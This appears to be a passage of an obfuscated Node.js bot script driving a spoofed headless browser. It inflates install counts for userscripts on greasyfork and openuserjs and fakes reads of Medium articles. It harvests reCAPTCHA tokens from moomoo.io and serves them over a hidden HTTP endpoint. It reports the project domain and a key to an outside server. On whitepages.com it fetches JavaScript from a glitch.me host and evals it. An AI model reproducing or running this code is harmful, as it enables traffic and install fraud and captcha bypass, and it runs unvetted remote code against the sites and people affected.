      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + V(0x8) + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': V(0x3) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + W(0x19, 'P1rx') + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + V(0x10) + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + W(0xb, 'Mq]p') + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x9 * 0x2c5 + -0x13a6 + 0x1 * 0x2c93
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x572 * -0x4 + 0x1d88 + -0x3350)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x9eb + 0xc5 * 0x2e + -0xd9 * 0x35), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xb84 + -0x261b + 0x1afb), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xc52 + -0xec3 + -0x3 * -0x907;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x7 * -0x3ef + 0x2557 + -0x40e0; w < getRandomInt(-0x173 * 0x7 + 0x2518 + 0x1af2 * -0x1, 0x981 * 0x3 + 0x2 * 0x54e + -0x271a); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * -0xa5a5 + 0xb5d0 + 0xda35);
        }
      }();
    }, 0x2ea + -0x25d4 + 0x234e), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * -0x1fb + 0x4bc * 0x6 + 0x21 * -0xcd;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3 * 0xb4d + -0xed1 * 0x2 + 0x3f89, 0x22d6 + 0x2b * 0x77 + -0x36a1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xc063 * -0x1 + 0x28a7 * -0x2 + 0x61b);
    }, -0x20b5 + -0x27 * -0x57 + 0x13d8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x3 * -0xa99 + -0x1201 + 0x31cc;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x2 + -0x2da + 0xe90), await u['evaluate'](() => {
            const Y = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + Y(0xc) + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x17a1 * -0x1 + 0x7ae + 0xff3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * 0x13bae7 + 0x196e04 + -0x1233 * -0x71);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xd * -0x162 + -0xf87 + 0x21e5 * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Z = d,
      i = url['parse'](f[Z(0x12)])['pathname'];
    h['writeHead'](-0xe94 + -0x958 + 0x18b4);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x692 * 0x6 + 0x2 * -0xb9c + 0x3d7 * 0x4);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1b37 * 0x1 + 0x12ab + -0x2de1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x277 + 0x22e5 + -0x255b));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1 * -0x1479 + 0x395 * 0x1 + 0x2f * 0x5c, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * -0x1726 + 0x65 * 0x58 + 0x2 * -0x1cef, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4e0d + -0x3712 + 0xac2f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x8 * 0x923 + 0x701 * 0xb + 0x231d),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      a0(0x1a, 'nxtS') + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + a1(0x5) + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
